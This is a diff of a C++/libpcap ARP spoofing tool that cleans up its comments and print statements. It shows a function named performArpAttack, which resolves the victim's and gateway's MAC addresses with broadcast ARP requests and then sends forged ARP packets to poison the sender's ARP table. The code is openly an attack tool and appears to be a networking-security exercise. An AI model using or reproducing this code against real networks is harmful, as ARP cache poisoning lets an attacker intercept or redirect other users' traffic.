@@ -19,9 +19,7 @@ using namespace std;
 std::map<Ip, Mac> mac_cache;
 
 
-void print_mac_address(const Mac& mac) {
-	printf("%s\n", static_cast<std::string>(mac).c_str());
-}
+void print_mac_address(const Mac& mac) { 	printf("%s\n", static_cast<std::string>(mac).c_str()); }
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -72,20 +70,19 @@ void make_send_packet(EthArpPacket &packet_send, const Mac& eth_sender_mac, cons
 	packet_send.arp_.hln_ = Mac::SIZE;
 	packet_send.arp_.pln_ = Ip::SIZE;
 
-	packet_send.eth_.dmac_ = eth_target_mac;//i dont know
-	packet_send.eth_.smac_ = eth_sender_mac;//sender macc
+	packet_send.eth_.dmac_ = eth_target_mac;
+	packet_send.eth_.smac_ = eth_sender_mac;
 
-	packet_send.arp_.smac_ = arp_sender_mac; //sender mac
-	packet_send.arp_.sip_ = htonl(static_cast<uint32_t>(sender_ip)); //sender IP
+	packet_send.arp_.smac_ = arp_sender_mac; 
+	packet_send.arp_.sip_ = htonl(static_cast<uint32_t>(sender_ip)); 
 	
-	packet_send.arp_.tmac_ = arp_target_mac; //i dont know
-	packet_send.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));//target IP
+	packet_send.arp_.tmac_ = arp_target_mac;
+	packet_send.arp_.tip_ = htonl(static_cast<uint32_t>(target_ip));
 
 }
 
-//void change_target_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){
 void change_sender_arp_table(pcap_t* handle,const Mac& my_mac, const Mac& sender_mac, const Ip& target_ip, const Ip& sender_ip){
-	printf("Sender IP Address: %s, Target IP Address: %s\n\n", static_cast<std::string>(sender_ip).c_str(), static_cast<std::string>(target_ip).c_str());
+	printf("Sender IP Address: %s, Target IP Address: %s\n", static_cast<std::string>(sender_ip).c_str(), static_cast<std::string>(target_ip).c_str());
 	printf("Sender MAC Address: ");
 	print_mac_address(sender_mac);
 
@@ -118,7 +115,7 @@ int get_mac_address(pcap_t* handle, const Mac& my_mac, const Ip& my_ip, Mac& des
     const Mac& zero = Mac::nullMac();
 	make_send_packet(packet_send, my_mac, broadcast, my_mac,my_ip,   zero, dest_ip);
 	
-	//send PAcket!!!!
+	//send ARP request PAcket!!!!
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_send), sizeof(EthArpPacket));
 	if (res != 0) {
 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -136,19 +133,10 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
 	Ip ip_of_new_addr, search_ip;
 	Mac sender_mac, target_mac, new_mac_addr;
 
-	// printf("\n===========!ARP Table attctk Start!==================\n");
+	printf("\n===========!ARP Table attctk Start!==================\n");
 
-	printf("Sender IP Address: %s\n", static_cast<std::string>(sender_ip).c_str());
-	// if (sender_ip == my_ip){ //or already in ip_set
-	// 	printf("--sender_ip==my_ip ---->  skip the find of sender's MAC address\n");
-	// 	sender_mac = my_mac;
-	// 	flag_send=2;	//2: find target mac
-	// }
+	printf("Sender IP Address: %s, ", static_cast<std::string>(sender_ip).c_str());
 	printf("Target IP Address: %s\n", static_cast<std::string>(target_ip).c_str());
-	// if (target_ip == my_ip){ //or already in ip_set
-	// 	printf("--target_ip==my_ip ----> skip the find of target's MAC address\n");
-	// 	flag_send=3;	//3: send arp table attack
-	// }
 
 	EthArpPacket packet_send;
 	struct pcap_pkthdr* header;
@@ -159,17 +147,13 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
 
 	while (1) {      
 		if(flag_send){//flag == 0: 수신만 기능
-			if(flag_send==1){//get sender, target's mac address
-				//printf("request sender's MAC\n");
+			if(flag_send==1){
 				if(get_mac_address(handle,my_mac, my_ip, sender_mac, sender_ip)) {
 					search_ip=sender_ip;
 				}else{
 					flag_send=2;
 				}
 			}else if(flag_send==2){
-				//printf("request target's MAC\n");
-				//get_mac_address(handle,my_mac, my_ip, target_mac, target_ip);
-				//search_ip=target_ip;
 				if(get_mac_address(handle,my_mac, my_ip, target_mac, target_ip)) {
 					search_ip=target_ip;
 				}else{
@@ -179,11 +163,11 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
 			if(flag_send==3){
 				printf("Attack!!\n");
 				change_sender_arp_table(handle,my_mac, sender_mac, target_ip, sender_ip);
-				flag_send=1;
+				
 				return 0;
 				flag_send=4;
 			} else if(flag_send==4){
-				printf("Attack is finished!");
+				//another request...
 				return 0;
 			}
 		}
@@ -200,8 +184,6 @@ int performArpAttack(pcap_t* handle, char* dev, const Ip& my_ip, const Mac& my_m
 		struct EthArpPacket* EAPacket = (struct EthArpPacket*)packet_receive;
         if ((EAPacket->eth_.type() == EthHdr::Arp)&&(flag_send==1 || flag_send==2)) {
 			ip_of_new_addr = EAPacket->arp_.sip();
-			//printf("ip_of_new_addr(%s) =>\n ", static_cast<std::string>(ip_of_new_addr).c_str());
-			//printf("search_ip (%s) =>\n ", static_cast<std::string>(search_ip).c_str());
 
             if ((EAPacket->arp_.op() == ArpHdr::Reply)&&(ip_of_new_addr==search_ip)) {//check ip too//&&(arp_hdr->ar_sip==sender_ip)
 				
@@ -243,7 +225,6 @@ int main(int argc, char* argv[]) {
 	printf("My IP Address: %s\n",  static_cast<std::string>(my_ip).c_str());
 	printf("My Mac Address: ");
 	print_mac_address(my_mac);
-	printf("===============================================\n");
 	
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
